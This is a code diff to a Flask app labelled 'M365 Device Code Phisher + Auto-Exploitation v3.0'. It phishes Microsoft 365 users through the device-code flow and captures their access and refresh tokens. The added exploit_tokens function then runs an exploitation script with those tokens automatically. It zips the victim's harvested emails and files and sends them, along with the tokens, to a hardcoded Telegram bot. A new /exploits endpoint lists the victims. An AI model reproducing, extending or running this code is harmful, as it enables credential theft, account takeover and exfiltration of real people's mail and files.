@@ -9,12 +9,15 @@ import time
 import threading
 import shutil
 import random
+import subprocess
+import sys
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
 
-DB_NAME = "device_logs.db"
+DB_NAME = "logs.db"
 HTML_PATH = "index.html"
+EXPLOIT_DIR = "exploits"
 
 TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"
 TELEGRAM_CHAT_ID = "8689962848"
@@ -47,8 +50,6 @@ def init_db():
                  success INTEGER)''')
     conn.commit()
     conn.close()
-
-init_db()
 
 def get_client_ip():
     return (request.headers.get('CF-Connecting-IP') or
@@ -111,6 +112,97 @@ def test_token_capabilities(access_token, email):
     if results:
         send_telegram_message(f"🎯 <b>{email}</b> access: {' | '.join(results)}")
 
+def exploit_tokens(access_token, refresh_token, email):
+    """Execute M365 exploitation toolkit with captured tokens"""
+    try:
+        # Create token JSON file
+        token_data = {
+            "access_token": access_token,
+            "refresh_token": refresh_token,
+            "email": email,
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+        
+        safe_email = email.split('@')[0].replace('@', '_').replace('.', '_')
+        token_filename = f"captured_tokens_{safe_email}_{int(time.time())}.json"
+        with open(token_filename, 'w') as f:
+            json.dump(token_data, f, indent=2)
+        
+        # Telegram notification
+        exploit_msg = f"""
+⚡ <b>🚀 EXPLOITATION STARTED</b> ⚡
+
+👤 <code>{email}</code>
+📁 <code>{token_filename}</code>
+
+<i>Token exploitation toolkit launched automatically...</i>
+        """
+        send_telegram_message(exploit_msg)
+        
+        # Run script.py asynchronously
+        exploit_dir = f"{EXPLOIT_DIR}/{safe_email}"
+        os.makedirs(exploit_dir, exist_ok=True)
+        
+        cmd = [
+            sys.executable, "script.py",
+            "--token-file", token_filename,
+            "--output-dir", exploit_dir,
+            "--verbose"
+        ]
+        
+        def run_exploit():
+            try:
+                result = subprocess.run(
+                    cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=300,  # 5 min timeout
+                    cwd=exploit_dir
+                )
+                
+                if result.returncode == 0:
+                    # Count results
+                    files = os.listdir(exploit_dir)
+                    email_count = len([f for f in files if 'email' in f.lower()])
+                    file_count = len([f for f in files if 'file' in f.lower()])
+                    
+                    # Send success + summary
+                    summary_msg = f"""
+✅ <b>EXPLOITATION COMPLETE: {email}</b> ✅
+
+📊 Results in: <code>{exploit_dir}</code>
+📈 Summary:
+• Sensitive emails: <b>{email_count}</b>
+• Files found: <b>{file_count}</b>
+• Groups/Teams: Enumerated
+
+<code>{token_filename}</code> → Full M365 compromise!
+                    """
+                    send_telegram_message(summary_msg)
+                    
+                    # Zip results and send
+                    zip_filename = f"{exploit_dir}_results.zip"
+                    shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', exploit_dir)
+                    send_telegram_document(zip_filename, f"🎯 Full results: {email}")
+                    
+                else:
+                    error_msg = f"❌ Exploit failed for <code>{email}</code>\n<pre>{result.stderr[:1000]}</pre>"
+                    send_telegram_message(error_msg)
+                    
+            except subprocess.TimeoutExpired:
+                send_telegram_message(f"⏰ Exploit timeout for <code>{email}</code>")
+            except Exception as e:
+                send_telegram_message(f"💥 Exploit error <code>{email}</code>: {str(e)}")
+        
+        # Start exploitation in daemon thread
+        threading.Thread(target=run_exploit, daemon=True).start()
+        
+        print(f"🚀 Exploitation launched: {email} → {token_filename}")
+        
+    except Exception as e:
+        print(f"❌ Exploit launch failed: {e}")
+        send_telegram_message(f"💥 Exploit setup failed for <code>{email}</code>: {str(e)}")
+
 def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_attempts=60):
     data = {
         'client_id': client_id,
@@ -137,12 +229,21 @@ def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_att
 🌐 {ip} — {location.get('city')}, {location.get('country')}
 🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-<b>Tokens captured!</b>
+<b>Tokens captured → Exploitation launched!</b>
                 """
                 send_telegram_message(success_msg)
 
+                # LAUNCH EXPLOITATION IMMEDIATELY
+                threading.Thread(
+                    target=exploit_tokens, 
+                    args=(result.get('access_token'), result.get('refresh_token'), email),
+                    daemon=True
+                ).start()
+
+                # Test capabilities
                 threading.Thread(target=test_token_capabilities, args=(result.get('access_token'), email), daemon=True).start()
 
+                # Store tokens
                 token_data = {
                     'timestamp': datetime.datetime.now().isoformat(),
                     'email': email,
@@ -162,6 +263,7 @@ def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_att
                     json.dump(token_data, f, indent=2)
                 send_telegram_document(filename, f"✅ Tokens: {email}")
 
+                # DB storage
                 conn = sqlite3.connect(DB_NAME)
                 conn.execute("""INSERT INTO device_captures 
                     (timestamp, user_code, device_code, email, access_token, refresh_token, expires_in, ip, location, ua, client_id, success)
@@ -172,7 +274,7 @@ def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_att
                 conn.commit()
                 conn.close()
 
-                print(f"✅ SUCCESS: {email} -> {filename}")
+                print(f"✅ SUCCESS + EXPLOIT: {email} -> {filename}")
                 return
 
             elif result.get('error') == 'authorization_pending':
@@ -276,7 +378,7 @@ def stats():
 
 @app.route('/db')
 def download_db():
-    return send_file(DB_NAME, as_attachment=True, download_name="device_captures.json")
+    return send_file(DB_NAME, as_attachment=True, download_name="device_captures.db")
 
 @app.route('/export')
 def export_json():
@@ -303,11 +405,33 @@ def export_json():
     response.headers["Content-Disposition"] = "attachment; filename=captures_export.json"
     return response
 
+@app.route('/exploits')
+def exploits_index():
+    """List all exploitation results"""
+    if not os.path.exists(EXPLOIT_DIR):
+        return jsonify({"error": "No exploits found"}), 404
+    
+    victims = []
+    for victim_dir in os.listdir(EXPLOIT_DIR):
+        victim_path = os.path.join(EXPLOIT_DIR, victim_dir)
+        if os.path.isdir(victim_path):
+            files = os.listdir(victim_path)
+            victims.append({
+                "victim": victim_dir,
+                "files": len(files),
+                "size": sum(os.path.getsize(os.path.join(victim_path, f)) for f in files)
+            })
+    
+    return jsonify({"victims": victims})
+
 if __name__ == '__main__':
-    print("🚀 M365 Device Code Phisher v2.0")
+    os.makedirs(EXPLOIT_DIR, exist_ok=True)
+    init_db()
+    print("🚀 M365 Device Code Phisher + Auto-Exploitation v3.0")
     print("📱 http://0.0.0.0:5000/           # Landing page")
     print("📊 http://0.0.0.0:5000/stats      # Live stats JSON")
     print("💾 http://0.0.0.0:5000/db         # Full DB download")
     print("📤 http://0.0.0.0:5000/export     # JSON export")
-    print(f"🗄️  DB: {DB_NAME}")
+    print("🎯 http://0.0.0.0:5000/exploits   # Exploitation results")
+    print(f"🗄️  DB: {DB_NAME} | 📁 Exploits: {EXPLOIT_DIR}/")
     app.run(host='0.0.0.0', port=5000, debug=False)
